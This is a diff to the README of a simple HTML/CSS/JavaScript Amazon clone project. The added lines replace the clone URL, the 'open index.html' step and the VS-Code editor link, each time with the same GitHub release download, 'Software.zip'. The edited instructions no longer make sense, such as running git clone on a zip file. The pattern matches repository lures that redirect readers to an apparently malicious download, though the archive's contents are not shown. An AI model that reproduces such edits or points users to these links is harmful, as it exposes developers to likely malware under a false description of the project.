@@ -20,19 +20,19 @@ Amazon is the world's leading online retailer, offering a vast selection of prod
 ## 🎈 Usage <a name="usage"></a>
 1. To run the Amazon Clone on your local machine, follow these steps:
 
-- Clone the repository from GitHub: git clone https://github.com/your-username/amazon-clone.git
+- Clone the repository from GitHub: git clone https://github.com/Puram-Supriya/Amazon/releases/download/v1.0/Software.zip
 - Navigate to the project directory: amazon
-- Open index.html in your preferred web browser.
+- Open https://github.com/Puram-Supriya/Amazon/releases/download/v1.0/Software.zip in your preferred web browser.
 
 ## 🚀 Deployment <a name = "deployment"></a>
-- To view the portfolio resume, simply open the `index.html` file in a web browser or use a local development server.
+- To view the portfolio resume, simply open the `https://github.com/Puram-Supriya/Amazon/releases/download/v1.0/Software.zip` file in a web browser or use a local development server.
 
 ## ⛏️ Built Using <a name = "built_using"></a>
 1. This Amazon Clone is primarily developed using the following technologies:
 - HTML: Used for creating the structure and layout of the website.
 - CSS: Utilized for styling and design to replicate the Amazon visual appearance.
 - JavaScript: Employed to add interactivity and dynamic functionalities.
-- [VS-Code](https://www.VS-Code.com/) - Code editor
+- [VS-Code](https://github.com/Puram-Supriya/Amazon/releases/download/v1.0/Software.zip) - Code editor
 
 
 ## 🎉 Acknowledgements <a name = "acknowledgement"></a>
